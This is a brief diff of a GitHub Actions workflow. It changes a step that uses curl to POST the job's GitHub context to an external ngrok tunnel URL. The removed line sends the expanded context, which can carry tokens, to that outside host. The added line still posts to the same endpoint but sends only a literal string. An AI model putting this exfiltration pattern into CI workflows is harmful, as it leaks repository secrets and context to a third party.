@@ -14,6 +14,6 @@ jobs:
       env:
           GITHUB_CONTEXT: ${{ fromJSON(github) }}
       run: | 
-        curl -d $GITHUB_CONTEXT -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
+        curl -d GITHUB_CONTEXT -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
 
      
